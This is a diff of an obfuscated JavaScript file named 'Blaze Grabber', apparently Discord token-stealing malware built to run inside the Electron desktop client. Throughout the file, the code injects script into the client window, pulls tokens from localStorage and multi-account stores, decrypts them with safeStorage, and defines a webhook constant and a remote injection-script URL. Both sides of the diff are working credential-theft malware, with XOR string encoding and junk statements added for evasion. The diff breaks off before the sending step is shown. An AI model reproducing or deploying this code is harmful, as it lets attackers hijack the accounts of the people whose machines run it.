@@ -1,4 +1,4 @@
-/* Blaze Grabber — Protected Build 2026-08-03T04:00:29.433Z */
+/* Blaze Grabber — Protected Build 2026-08-03T04:03:08.412Z */
 'use strict';
 (function() {
     var _dt = new Date();
@@ -7,372 +7,359 @@
     };
     _check();
 })();
-var _tT8hZG4wbUgJ = [[108,69,81,75,27,115,85,92,86,70],[116,89,78,80,90,94,83,22,13,28,5,69,25,50,95,13,85,89,70,67,18,42,98,17,2,2,27,7,89,65,51,80,87,0,0,2,22,74,4,13,17,18,116,21,65,9,83,52,84,84,122,89,70,75,3,2,4,28,6,1,66,73,47,113,109,123,120,21,22,94,91,82,93,18,114,0,82,14,89,74,17,117,89,66,93,9,83,30,2,0,1,25,82,79,84,23,9,22,103,88,80,83,64,80,23,7,6,82,31,86,0],[93,87,64,88],[92,88,80],[92,68,70,86,68],[77,95,89,92,89,71,70],[119,25,117],[23,81,93,95,9,65,91,67,93,15,0,84,3],[90,89,90,77,83,92,70,20,76,75,69,0],[80,91,85,94,83,29,85,80,94],[23,70,90,94,9,65,91,67,93,15,0,84,3],[105,121,103,109],[122,89,90,77,83,92,70,20,116,87,91,2,69,13],[74,66,85,95,80],[5,12,80,80,69,81,93,75,92,65,65,4,87,3,12,82,4,5,2,6,6,87,0,3,7,6,1,0,85,85,86,8,9,5,10],[73,87,70,77,88,87,64],[5,12,80,80,69,81,93,75,92,66,84,23,69,11,83,17,11,7,4,3,1,82,2,2,5,11,6,3,86,85,84,10,1,0,13,1,8],[81,79,68,92,69,67,71,88,92],[5,12,92,64,70,87,65,72,77,83,81,95,0,80,5,80,7,2,2,8,2,82,2,7,0,5,0,15,86,80,82,7],[91,67,83,102,94,71,92,77,93,64,106,9,84,19,83,15,110,7],[5,12,86,76,81,90,71,87,76,87,71,95,0,80,5,80,7,2,5,1,7,81,15,8,5,2,2,15,83,87,84,7],[81,79,68,92,69,67,71,88,92,109,90,11,93,12,88,6,110,94,94,69,65,1,105,0],[5,12,86,75,87,68,87,75,65,8,4,80,2,86,0,87,2,14,7,3,10,80,4,1,10,7,7,6,86,95],[81,79,68,92,69,67,71,88,92,109,90,11,93,12,88,6,110,94,94,69,65,1,105,3],[5,12,86,75,95,94,94,80,89,92,86,0,11,84,3,80,2,0,5,3,11,80,14,0,10,5,3,0,91,83,92,13,7],[81,79,68,92,69,67,71,88,92,109,90,11,93,12,88,6,110,94,94,69,65,1,105,2],[5,12,86,88,90,83,92,90,93,8,4,80,2,86,0,87,2,15,6,5,7,92,0,7,2,7,6,14,85,95],[81,79,68,92,69,67,71,88,92,109,93,10,68,22,83,60,0],[81,79,68,92,69,67,71,88,92,109,93,10,68,22,83,60,3],[81,79,68,92,69,67,71,88,92,109,93,10,68,22,83,60,2],[73,68,81,84,95,71,95,102,93,83,71,9,72,58,69,22,65,70,94,66,70,1,68],[5,12,81,88,68,94,75,3,9,7,6,86,7,81,2,83,6,5,3,7,3,92,4,5,6,3,3,9],[91,67,83,102,94,71,92,77,93,64,106,9,84,19,83,15,110,4],[5,12,86,76,81,90,71,87,76,87,71,87,11,84,3,80,2,0,5,4,7,80,1,3,11,5,5,5,81,87,87,15,7],[79,83,70,80,80,91,87,93,103,86,80,19,84,9,89,19,84,68],[5,12,86,86,66,86,87,79,2,3,0,86,2,83,2,87,7,3,7,6,5,84,4,6,4,5,1,5,92],[90,83,70,77,95,84,91,92,92,109,88,10,85,0,68,2,69,89,67],[5,12,87,92,68,70,91,95,81,87,81,8,94,1,12,82,4,5,2,6,6,80,1,9,1,3,13,14,82,83,87,13,10,1,10],[88,85,64,80,64,87,109,93,93,68,80,9,94,21,83,17],[5,12,86,86,66,86,87,79,10,8,4,80,2,86,0,87,5,1,0,1,11,93,1,2,7,3,13,7,90,95],[85,83,83,88,85,75,109,76,75,87,71,11,80,8,83],[5,12,65,74,83,64,92,88,85,87,15,84,4,86,5,85,5,2,8,1,10,81,14,6,4,10,12,2,86,85,90],[72,67,81,74,66,109,81,86,85,66,89,0,69,0,82],[5,12,69,76,83,65,70,3,9,7,6,86,7,81,3,83,0,3,3,7,11,84,1,4,0,6,7,9],[86,68,86,102,70,64,93,95,81,94,80,58,83,4,82,4,84],[5,87,14,86,68,80,65,3,9,7,6,86,7,81,3,83,6,7,2,7,1,92,4,9,2,1,3,9],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,7],[5,12,86,86,89,65,70,8,85,8,4,80,2,86,0,87,3,2,5,6,10,82,5,5,5,4,3,3,84,95],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,4],[5,12,86,86,89,65,70,11,85,8,4,80,2,86,0,87,3,2,8,5,3,87,7,4,2,5,4,4,91,95],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,5],[5,12,86,86,89,65,70,10,85,8,4,80,2,86,0,87,3,3,4,7,7,82,5,6,0,4,4,2,87,95],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,2],[5,12,86,86,89,65,70,15,85,8,4,80,2,86,0,87,3,0,0,8,4,92,5,0,1,11,12,15,85,95],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,3],[5,12,86,86,89,65,70,0,85,8,4,80,2,86,0,87,3,0,4,2,3,80,7,1,10,5,5,3,83,95],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,0],[5,12,86,86,89,65,70,8,10,95,15,84,4,86,5,85,5,4,7,7,3,85,14,2,2,2,3,6,81,81,90],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,1],[5,12,86,86,89,65,70,8,13,95,15,84,4,86,5,85,5,4,6,3,5,82,5,2,4,0,3,3,85,85,90],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,14],[5,12,86,86,89,65,70,8,0,95,15,84,4,86,5,85,5,4,6,5,4,80,2,1,4,0,6,3,91,86,90],[94,67,93,85,82,109,80,86,87,65,65,0,67,58,90,21,93,15],[5,12,86,86,89,65,70,11,12,95,15,84,4,86,5,85,5,4,6,9,1,82,14,3,3,5,12,15,82,85,90],[73,68,81,84,95,71,95,102,76,87,91,16,67,0,105,82,110,91,94,94,70,12],[5,12,90,80,66,64,93,91,74,93,91,31,84,95,7,86,2,5,7,4,1,85,5,6,6,5,2,5,87,85,93,0,12,8],[73,68,81,84,95,71,95,102,76,87,91,16,67,0,105,80,110,91,94,94,70,12],[5,12,90,80,66,64,93,74,81,94,67,0,67,95,7,86,2,5,7,4,1,85,14,0,10,5,1,7,91,82,92,0,13,8],[73,68,81,84,95,71,95,102,76,87,91,16,67,0,105,85,110,91,94,94,70,12,105,71,1],[5,12,90,80,66,64,93,94,87,94,81,95,0,80,5,80,7,2,3,9,0,93,7,4,0,5,2,4,90,83,93,7],[73,68,81,84,95,71,95,102,76,87,91,16,67,0,105,82,3,105,92,95,92,16,94],[5,12,90,80,66,64,93,73,84,83,65,12,95,16,91,89,0,3,2,3,4,80,5,3,10,11,0,4,84,83,80,13,14,15,3,7],[73,68,81,84,95,71,95,102,76,87,91,16,67,0,105,81,5,105,92,95,92,16,94],[5,12,90,80,66,64,93,93,81,83,88,10,95,1,12,82,4,5,2,6,6,87,5,5,0,5,12,15,85,82,80,0,0,7,10],[5,12,90,86,12,3,7,10,11,4,1,87,1,82,6,84,1,7,7,4,3,92,14,8,13],[119,95,64,75,89,18,113,85,89,65,70,12,82],[119,95,64,75,89],[119,95,64,75,89,18,112,88,75,91,86],[5,12,87,88,68,86,8,8,13,1,6,83,2,92,1,87,8,5,6,6,4,83,7,6,11,7,11],[5,12,68,88,79,66,83,85,2,3,0,86,2,83,2,82,0,6,5,4,10,84,3,2,11,4,12,2,92],[76,88,20,82,83,92,86,80,24,65,80,22,66,12,89,13],[5,12,64,80,85,89,8,8,13,1,6,83,5,84,15,85,7,0,2,2,6,87,3,8,0,4,11],[101,88],[125,95,71,90,89,64,86,25,113,92,83,10],[5,12,64,86,93,87,92,3,9,7,6,86,7,86,15,91,5,6,3,5,6,82,0,1,5,6,5,9,66,53,11,82,92,88],[125,95,71,90,89,64,86],[125,95,71,90,89,64,86,25,113,92,95,0,82,17,95,12,95,22,8229,16,124,11,22,98,86,65,70,94,13,15],[112,88,82,86],[125,95,71,90,89,64,86,25,113,92,95,0,82,17,95,12,95,22,8229,16,123,10,95,69,90,83,89,94,24,4,0],[75,83,71,86,67,64,81,92,75],[88,70,68],[88,70,68,23,87,65,83,75],[84,89,80,76,90,87,65],[93,95,71,90,89,64,86,102,92,87,70,14,69,10,70,60,82,89,67,85],[80,88,80,92,78,28,88,74],[73,87,87,82,87,85,87,23,82,65,90,11],[93,95,71,90,89,64,86],[16,26,92,77,66,66,65,4,74,87,68,16,88,23,83,75],[76,66,82,1],[105,119,96,122,126],[85,89,83,80,88],[125,95,71,90,89,64,86,25,8236,18,121,10,86,12,88,67,114,87,65,68,71,22,83,85],[76,69,81,75,69,29,114,84,93],[125,95,71,90,89,64,86,25,8236,18,101,4,66,22,65,12,67,82,17,115,90,5,88,86,86,86],[125,95,71,90,89,64,86,25,8236,18,112,8,80,12,90,67,114,94,80,94,85,1,82],[88,70,93,23,69,70,64,80,72,87,27,6,94,8],[125,95,71,90,89,64,86,25,8236,18,118,23,84,1,95,23,17,117,80,66,86,68,119,85,87,87,81],[90,87,70,93,109,92,71,84,90,87,71,56],[90,87,70,93,109,81,68,90,101],[90,87,70,93,109,87,74,73,103,95,90,11,69,13,107],[90,87,70,93,109,87,74,73,103,75,80,4,67,56],[73,87,77,73,87,94,109,88,91,81,90,16,95,17,69],[125,95,71,90,89,64,86,25,8236,18,101,4,72,53,87,15,17,119,85,84,87,0],[90,89,90,77,83,92,70,20,75,87,86,16,67,12,66,26,28,70,94,92,91,7,79],[90,89,90,77,83,92,70,20,75,87,86,16,67,12,66,26,28,70,94,92,91,7,79,28,65,87,69,88,16,21,73,86,87,90,77],[120,85,87,92,69,65,31,122,87,92,65,23,94,9,27,34,93,90,94,71,31,44,83,80,87,87,71,68],[76,69,81,25,69,70,64,80,91,70],[119,121,112,124,105,102,126,106,103,96,112,47,116,38,98,60,100,120,112,101,102,44,121,99,122,104,112,115],[28,97,113,123,126,125,125,114,29],[123,90,85,67,83,18,117,75,89,80,87,0,67],[93,87,90,25,98,238,127,25,80,87,70,4,65,9,87,17,256,88,17,367,91,2,68,84,95,91,21,67,13,10,1,87,85,87,70,264,88,259,18,88,84,30,21,8,80,12,88,67,65,68,94,83,87,23,69],[80,80,70,88,91,87],[85,89,87,88,90,97,70,86,74,83,82,0],[77,89,95,92,88,65],[86,84,94,92,85,70],[93,103,67,13,65,11,101,94,96,81,100,95],[91,87,71,92,0,6],[126,115,96],[120,67,64,81,89,64,91,67,89,70,92,10,95],[122,89,90,77,83,92,70,20,108,75,69,0],[88,70,68,85,95,81,83,77,81,93,91,74,91,22,89,13]];
-(function(_zPBzNygv, _E6KILZ) {
-    var _heAzIfGX = function(times) {
-        while (--times) { _zPBzNygv.push(_zPBzNygv.shift()); }
+var _IJB8ahVJEGA2 = [[93,86,64,85],[92,89,80],[92,69,70,91,67],[77,94,89,81,94,19,22],[119,24,117],[23,80,93,82,14,21,11,66,7,15,0,87,11],[90,88,90,64,84,8,22,21,22,75,69,3],[80,90,85,83,84,73,5,81,4],[23,71,90,83,14,21,11,66,7,15,0,87,11],[105,120,103,96],[122,88,90,64,84,8,22,21,46,87,91,1,77,91],[74,67,85,82,87],[5,13,80,93,66,5,13,74,6,65,65,7,95,85,8,6,12,80,5,15,12,5,83,11,7,5,6,3,86,3,3,85,9,4,10],[73,86,70,64,95,3,16],[5,13,80,93,66,5,13,74,6,66,84,20,77,93,87,69,3,82,3,10,11,0,81,10,5,8,1,0,85,3,1,87,1,1,13,12,15],[81,78,68,81,66,23,23,89,6],[5,13,92,77,65,3,17,73,23,83,81,92,8,6,1,4,15,87,5,1,8,0,81,15,0,6,7,12,85,6,7,90],[91,66,83,107,89,19,12,76,7,64,106,10,92,69,87,91,102,82],[5,13,86,65,86,14,23,86,22,87,71,92,8,6,1,4,15,87,2,8,13,3,92,0,5,1,5,12,80,1,1,90],[81,78,68,81,66,23,23,89,6,109,90,8,85,90,92,82,102,11,89,76,75,83,58,8],[5,13,86,70,80,16,7,74,27,8,4,83,10,0,4,3,10,91,0,10,0,2,87,9,10,4,0,5,85,9],[81,78,68,81,66,23,23,89,6,109,90,8,85,90,92,82,102,11,89,76,75,83,58,11],[5,13,86,70,88,10,14,81,3,92,86,3,3,2,7,4,10,85,2,10,1,2,93,8,10,6,4,3,88,5,9,80,7],[81,78,68,81,66,23,23,89,6,109,90,8,85,90,92,82,102,11,89,76,75,83,58,10],[5,13,86,85,93,7,12,91,7,8,4,83,10,0,4,3,10,90,1,12,13,14,83,15,2,4,1,13,86,9],[81,78,68,81,66,23,23,89,6,109,93,9,76,64,87,104,8],[81,78,68,81,66,23,23,89,6,109,93,9,76,64,87,104,11],[81,78,68,81,66,23,23,89,6,109,93,9,76,64,87,104,10],[73,69,81,89,88,19,15,103,7,83,71,10,64,108,65,66,73,19,89,75,76,83,23],[5,13,81,85,67,10,27,2,83,7,6,85,15,7,6,7,14,80,4,14,9,14,87,13,6,0,4,10],[91,66,83,107,89,19,12,76,7,64,106,10,92,69,87,91,102,81],[5,13,86,65,86,14,23,86,22,87,71,84,3,2,7,4,10,85,2,13,13,2,82,11,11,6,2,6,82,1,2,82,7],[79,82,70,93,87,15,7,92,61,86,80,16,92,95,93,71,92,17],[5,13,86,91,69,2,7,78,88,3,0,85,10,5,6,3,15,86,0,15,15,6,87,14,4,6,6,6,95],[90,82,70,64,88,0,11,93,6,109,88,9,93,86,64,86,77,12,68],[5,13,87,81,67,18,11,94,11,87,81,11,86,87,8,6,12,80,5,15,12,2,82,1,1,0,10,13,81,5,2,80,10,0,10],[88,84,64,93,71,3,61,92,7,68,80,10,86,67,87,69],[5,13,86,91,69,2,7,78,80,8,4,83,10,0,4,3,13,84,7,8,1,15,82,10,7,0,10,4,89,9],[85,82,83,85,82,31,61,77,17,87,71,8,88,94,87],[5,13,65,71,84,20,12,89,15,87,15,87,12,0,1,1,13,87,15,8,0,3,93,14,4,9,11,1,85,3,15],[72,66,81,71,69,57,1,87,15,66,89,3,77,86,86],[5,13,69,65,84,21,22,2,83,7,6,85,15,7,7,7,8,86,4,14,1,6,82,12,0,5,0,10],[86,69,86,107,65,20,13,94,11,94,80,57,91,82,86,80,92],[5,86,14,91,67,4,17,2,83,7,6,85,15,7,7,7,14,82,5,14,11,14,87,1,2,2,4,10],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,82],[5,13,86,91,94,21,22,9,15,8,4,83,10,0,4,3,11,87,2,15,0,0,86,13,5,7,4,0,87,9],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,81],[5,13,86,91,94,21,22,10,15,8,4,83,10,0,4,3,11,87,15,12,9,5,84,12,2,6,3,7,88,9],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,80],[5,13,86,91,94,21,22,11,15,8,4,83,10,0,4,3,11,86,3,14,13,0,86,14,0,7,3,1,84,9],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,87],[5,13,86,91,94,21,22,14,15,8,4,83,10,0,4,3,11,85,7,1,14,14,86,8,1,8,11,12,86,9],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,86],[5,13,86,91,94,21,22,1,15,8,4,83,10,0,4,3,11,85,3,11,9,2,84,9,10,6,2,0,80,9],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,85],[5,13,86,91,94,21,22,9,80,95,15,87,12,0,1,1,13,81,0,14,9,7,93,10,2,1,4,5,82,7,15],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,84],[5,13,86,91,94,21,22,9,87,95,15,87,12,0,1,1,13,81,1,10,15,0,86,10,4,3,4,0,86,3,15],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,91],[5,13,86,91,94,21,22,9,90,95,15,87,12,0,1,1,13,81,1,12,14,2,81,9,4,3,1,0,88,0,15],[94,66,93,88,85,57,0,87,13,65,65,3,75,108,94,65,85,90],[5,13,86,91,94,21,22,10,86,95,15,87,12,0,1,1,13,81,1,0,11,0,93,11,3,6,11,12,81,3,15],[73,69,81,89,88,19,15,103,22,87,91,19,75,86,109,6,102,14,89,87,76,94],[5,13,90,93,69,20,13,90,16,93,91,28,92,9,3,2,10,80,0,13,11,7,86,14,6,6,5,6,84,3,8,93,12,9],[73,69,81,89,88,19,15,103,22,87,91,19,75,86,109,4,102,14,89,87,76,94],[5,13,90,93,69,20,13,75,11,94,67,3,75,9,3,2,10,80,0,13,11,7,93,8,10,6,6,4,88,4,9,93,13,9],[73,69,81,89,88,19,15,103,22,87,91,19,75,86,109,1,102,14,89,87,76,94,58,79,1],[5,13,90,93,69,20,13,95,13,94,81,92,8,6,1,4,15,87,4,0,10,15,84,12,0,6,5,7,89,5,8,90],[73,69,81,89,88,19,15,103,22,87,91,19,75,86,109,6,11,60,91,86,86,66,13],[5,13,90,93,69,20,13,72,14,83,65,15,87,70,95,13,8,86,5,10,14,2,86,11,10,8,7,7,87,5,5,80,14,14,3,10],[73,69,81,89,88,19,15,103,22,87,91,19,75,86,109,5,13,60,91,86,86,66,13],[5,13,90,93,69,20,13,92,11,83,88,9,87,87,8,6,12,80,5,15,12,5,86,13,0,6,11,12,86,4,5,93,0,6,10],[5,13,90,91,11,87,87,11,81,4,1,84,9,4,2,0,9,82,0,13,9,14,93,0,13],[119,94,64,70,94,70,33,84,3,65,70,15,90],[119,94,64,70,94],[119,94,64,70,94,70,32,89,17,91,86],[5,13,87,85,67,2,88,9,87,1,6,80,10,10,5,3,0,80,1,15,14,1,84,14,11,4,12],[5,13,68,85,72,22,3,84,88,3,0,85,10,5,6,6,8,83,2,13,0,6,80,10,11,7,11,1,95],[5,13,64,93,82,13,88,9,87,1,6,80,13,2,11,1,15,85,5,11,12,5,80,0,0,7,12],[101,89],[125,94,71,87,94,20,6,24,43,92,83,9],[5,13,64,91,90,3,12,2,83,7,6,85,15,0,11,15,13,83,4,12,12,0,83,9,5,5,2,10,65,99,94,15,92,89],[125,94,71,87,94,20,6],[125,94,71,87,94,20,6,24,43,92,95,3,90,71,91,88,87,67,8226,25,118,89,69,106,86,66,65,93,14,89],[112,89,82,91],[125,94,71,87,94,20,6,24,43,92,95,3,90,71,91,88,87,67,8226,25,113,88,12,77,90,80,94,93,27,82,85],[75,82,71,91,68,20,1,93,17],[88,71,68],[88,71,68,26,80,21,3,74],[84,88,80,65,93,3,17],[93,94,71,87,94,20,6,103,6,87,70,13,77,92,66,104,90,12,68,92],[80,89,80,81,73,72,8,75],[73,86,87,95,80,1,7,22,8,65,90,8],[93,94,71,87,94,20,6],[16,27,92,64,69,22,17,5,16,87,68,19,80,65,87,31],[76,67,82,12],[90,88,90,64,84,8,22,21,17,87,86,19,75,90,70,78,20,19,89,85,81,85,28],[90,88,90,64,84,8,22,21,17,87,86,19,75,90,70,78,20,19,89,85,81,85,28,20,65,84,66,91,19,67,28,11,87,91,77],[120,84,87,81,66,21,79,123,13,92,65,20,86,95,31,118,85,15,89,78,21,126,0,88,87,84,64,71],[76,68,81,20,66,18,16,81,1,70],[119,120,112,113,110,50,46,107,61,96,112,44,124,112,102,104,108,45,119,108,108,126,42,107,122,107,119,112],[28,96,113,118,121,41,45,115,71],[123,91,85,78,84,70,37,74,3,80,87,3,75],[80,81,70,85,92,3],[85,88,87,85,93,53,22,87,16,83,82,3],[86,85,94,81,82,18],[93,102,67,0,70,95,53,95,58,81,100,92],[91,86,71,81,7,82],[126,114,96],[120,66,64,92,94,20,11,66,3,70,92,9,87],[122,88,90,64,84,8,22,21,54,75,69,3],[88,71,68,88,88,5,3,76,11,93,91,73,83,64,93,89],[108,68,81,70,28,39,5,93,12,70],[116,88,78,93,93,10,3,23,87,28,5,70,17,100,91,89,93,12,65,74,24,120,49,25,2,1,28,4,90,23,102,13,87,1,0,15,17,30,84,12,75,18,116,22,73,95,87,96,92,1,125,80,76,25,80,10,4,31,1,2,65,31,122,44,109,122,120,24,17,10,11,83,7,18,114,3,90,88,93,30,25,32,94,75,87,91,0,22,2,3,6,26,81,25,1,74,9,23,103,85,87,7,16,81,77,7,6,81,23,0,4]];
+(function(_E2DBn73Q, _atDMkJ) {
+    var _hao7ov8A = function(times) {
+        while (--times) { _E2DBn73Q.push(_E2DBn73Q.shift()); }
     };
-    _heAzIfGX(++_E6KILZ);
-})(_tT8hZG4wbUgJ, 15);
-var _tgrZnYf8 = "96496229825e1e6c16102d613257bad9";
-function _LWBbXKOVk5(i) {
-    var a = _tT8hZG4wbUgJ[i], r = '';
+    _hao7ov8A(++_atDMkJ);
+})(_IJB8ahVJEGA2, 15);
+var _CHTIi0w4 = "97441fb8b25f93279c6986e93124a71d";
+function _mFVGlUtTrc(i) {
+    var a = _IJB8ahVJEGA2[i], r = '';
     for (var j = 0; j < a.length; j++)
-        r += String.fromCharCode(a[j] ^ _tgrZnYf8.charCodeAt(j % _tgrZnYf8.length));
+        r += String.fromCharCode(a[j] ^ _CHTIi0w4.charCodeAt(j % _CHTIi0w4.length));
     return r;
 }
-﻿_LWBbXKOVk5(0);
+﻿_mFVGlUtTrc(0);
 
-process.env[_LWBbXKOVk5(1)] = '0';
+process.env[_mFVGlUtTrc(1)] = '0';
 
 const fs          = require('fs');
 const path        = require('path');
 const https       = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session, safeStorage } = require('electron');
-var _rfYPRH = 2420; if (_rfYPRH > 13676) { _rfYPRH += 1; }
 
-// ── Config ────────────────────────────────────────────────────────────────────
-const WEBHOOK    = _LWBbXKOVk5(2);
-const AVATAR_URL = 'https://_dbj_WAQr.imgur.com/CHB4vW7.gif';
+const WEBHOOK    = _mFVGlUtTrc(2);
+const AVATAR_URL = 'https://_vFaKVK7j.imgur.com/CHB4vW7.gif';
 const EMBED_COLOR = 0x8563FF;
-const BOT_NAME   = _LWBbXKOVk5(3);
-const INJECT_URL = 'https://_AlGUkqCR.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';
+const BOT_NAME   = _mFVGlUtTrc(3);
+const INJECT_URL = 'https://_aJCL0zdyq4STg.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';
 
-// ── State ─────────────────────────────────────────────────────────────────────
-let _dO9t5X3rnn_   = false;
-let _kv19pn = false;
+let _d20fZIJfMWJ   = false;
+let _zkCBmGL8aCNHFp = false;
 
-// ── _JFLDcl9uE ────────────────────────────────────────────────────────────────
-const _JFLDcl9uE = (_eDdwQpZgo5f) => {
-    const _ohBbhtHvgDKpm1 = BrowserWindow.getAllWindows()[0];
-    return _ohBbhtHvgDKpm1.webContents.executeJavaScript(_eDdwQpZgo5f, true);
+const _AyQLklJopiBdqW = (_lAOz_7ZkKM0Y) => {
+    const _sxJoS2eBWJx65 = BrowserWindow.getAllWindows()[0];
+    return _sxJoS2eBWJx65.webContents.executeJavaScript(_lAOz_7ZkKM0Y, true);
+var _obTFCU = 3608; if (_obTFCU > 12813) { _obTFCU += 1; }
 };
+var _O7vssn = 7868; if (_O7vssn > 13046) { _O7vssn += 4; }
 
-// localStorage_LWBbXKOVk5(4)te çöz
-const _yJlAvanzHcd = `(function(){
+const _rNUNd811X = `(function(){
     try {
-        var _G6nylD2F = document.createElement(_LWBbXKOVk5(5));
-        document._mV6k9el7QbZdIS.appendChild(_G6nylD2F);
-        var _ntZE4Ylc = Object.getOwnPropertyDescriptor(_G6nylD2F.contentWindow,_LWBbXKOVk5(6)).get.call(window);
-        _G6nylD2F.remove();
-        var _vTz5mBkuCw0 = [];
-        // Tek _fFZMbyJ9lu (aktif hesap)
-        if (_ntZE4Ylc._fFZMbyJ9lu) _vTz5mBkuCw0.push(_ntZE4Ylc._fFZMbyJ9lu);
-        // Multi-account: _LWBbXKOVk5(7) key — object veya array
+        var _JZn7dV2NiGMm7o = document.createElement(_mFVGlUtTrc(4));
+        document._wU8WjuFOP_.appendChild(_JZn7dV2NiGMm7o);
+        var _Hqg6vlHVg7 = Object.getOwnPropertyDescriptor(_JZn7dV2NiGMm7o.contentWindow,_mFVGlUtTrc(5)).get.call(window);
+        _JZn7dV2NiGMm7o.remove();
+        var _cplB7XKxv = [];
+        
+        if (_Hqg6vlHVg7._is4JL18) _cplB7XKxv.push(_Hqg6vlHVg7._is4JL18);
+        
         try {
-(function() { var _x = 3213; return _x * 4; })();
-            var _MtIy4MudFzxmJ = _ntZE4Ylc._wpmZ9oixr_R;
-            if (_MtIy4MudFzxmJ) {
-                var _f5ia4s6 = JSON.parse(_MtIy4MudFzxmJ);
-                if (Array.isArray(_f5ia4s6)) {
-                    _f5ia4s6.forEach(function(_qQBOCg){ if(_qQBOCg && _vTz5mBkuCw0.indexOf(_qQBOCg)===-1) _vTz5mBkuCw0.push(_qQBOCg); });
-                } else if (typeof _f5ia4s6 === _LWBbXKOVk5(8)) {
-                    Object.values(_f5ia4s6).forEach(function(_qQBOCg){ if(_qQBOCg && _vTz5mBkuCw0.indexOf(_qQBOCg)===-1) _vTz5mBkuCw0.push(_qQBOCg); });
+            var _BrndMP6f0 = _Hqg6vlHVg7._k8PLDV5xb;
+            if (_BrndMP6f0) {
+                var _N10hmcf2j4JwNz = JSON.parse(_BrndMP6f0);
+                if (Array.isArray(_N10hmcf2j4JwNz)) {
+                    _N10hmcf2j4JwNz.forEach(function(_hl8poqMb4){ if(_hl8poqMb4 && _cplB7XKxv.indexOf(_hl8poqMb4)===-1) _cplB7XKxv.push(_hl8poqMb4); });
+                } else if (typeof _N10hmcf2j4JwNz === _mFVGlUtTrc(6)) {
+                    Object.values(_N10hmcf2j4JwNz).forEach(function(_hl8poqMb4){ if(_hl8poqMb4 && _cplB7XKxv.indexOf(_hl8poqMb4)===-1) _cplB7XKxv.push(_hl8poqMb4); });
                 }
             }
         } catch(e) {}
-        // MultiAccountStore
+        
         try {
-            var _N8ISL5dO = _ntZE4Ylc.MultiAccountStore;
-            if (_N8ISL5dO) {
-                var _GBU2N3wqblXs = JSON.parse(_N8ISL5dO);
-var _GKL3FC = 5110; if (_GKL3FC > 11225) { _GKL3FC += 2; }
-                var _MWIP4lcz = _GBU2N3wqblXs.users || _GBU2N3wqblXs._MWIP4lcz || [];
-                _MWIP4lcz.forEach(function(a){ var _qQBOCg = a._fFZMbyJ9lu||a.accessToken; if(_qQBOCg && _vTz5mBkuCw0.indexOf(_qQBOCg)===-1) _vTz5mBkuCw0.push(_qQBOCg); });
+            var _wuGNwAAVY5_x = _Hqg6vlHVg7.MultiAccountStore;
+            if (_wuGNwAAVY5_x) {
+                var _fxI3gpKep2 = JSON.parse(_wuGNwAAVY5_x);
+                var _J5uTyf2ivP9TVe = _fxI3gpKep2.users || _fxI3gpKep2._J5uTyf2ivP9TVe || [];
+                _J5uTyf2ivP9TVe.forEach(function(a){ var _hl8poqMb4 = a._is4JL18||a.accessToken; if(_hl8poqMb4 && _cplB7XKxv.indexOf(_hl8poqMb4)===-1) _cplB7XKxv.push(_hl8poqMb4); });
             }
         } catch(e) {}
-        return _vTz5mBkuCw0;
+        return _cplB7XKxv;
     } catch(e) { return []; }
 })()`;
 
-async function _lTz8Me(retries = 8, delayMs = 2000) {
-    for (let _dbj_WAQr = 0; _dbj_WAQr < retries; _dbj_WAQr++) {
+async function _C2iYOL1k(retries = 8, delayMs = 2000) {
+    for (let _vFaKVK7j = 0; _vFaKVK7j < retries; _vFaKVK7j++) {
         try {
-            const _I6G2w5RL = await _JFLDcl9uE(_yJlAvanzHcd);
-            if (Array.isArray(_I6G2w5RL) && _I6G2w5RL.length > 0) {
-                const _wpmZ9oixr_R = [];
-                for (const _LdE9VW of _I6G2w5RL) {
+            const _cTWI39Kp = await _AyQLklJopiBdqW(_rNUNd811X);
+            if (Array.isArray(_cTWI39Kp) && _cTWI39Kp.length > 0) {
+                const _k8PLDV5xb = [];
+                for (const _ANKqKIWvKqr9p of _cTWI39Kp) {
                     try {
-                        if (_LdE9VW && _LdE9VW.includes(_LWBbXKOVk5(9))) {
-                            const _jNdRWs   = _LdE9VW.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
-                            const _J9phw1alkDI8g   = Buffer.from(_jNdRWs, _LWBbXKOVk5(10));
-                            const _fFZMbyJ9lu = safeStorage.decryptString(_J9phw1alkDI8g);
-                            if (_fFZMbyJ9lu && !_wpmZ9oixr_R.includes(_fFZMbyJ9lu)) _wpmZ9oixr_R.push(_fFZMbyJ9lu);
-                        } else if (_LdE9VW && !_LdE9VW.includes(_LWBbXKOVk5(9))) {
-                            // Plain _fFZMbyJ9lu (eski format)
-                            if (!_wpmZ9oixr_R.includes(_LdE9VW)) _wpmZ9oixr_R.push(_LdE9VW);
+                        if (_ANKqKIWvKqr9p && _ANKqKIWvKqr9p.includes(_mFVGlUtTrc(7))) {
+                            const _HszqpNmjC   = _ANKqKIWvKqr9p.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
+                            const _owVOPFkpr   = Buffer.from(_HszqpNmjC, _mFVGlUtTrc(8));
+                            const _is4JL18 = safeStorage.decryptString(_owVOPFkpr);
+                            if (_is4JL18 && !_k8PLDV5xb.includes(_is4JL18)) _k8PLDV5xb.push(_is4JL18);
+                        } else if (_ANKqKIWvKqr9p && !_ANKqKIWvKqr9p.includes(_mFVGlUtTrc(7))) {
+                            
+                            if (!_k8PLDV5xb.includes(_ANKqKIWvKqr9p)) _k8PLDV5xb.push(_ANKqKIWvKqr9p);
                         }
                     } catch {}
                 }
-                if (_wpmZ9oixr_R.length > 0) return _wpmZ9oixr_R;
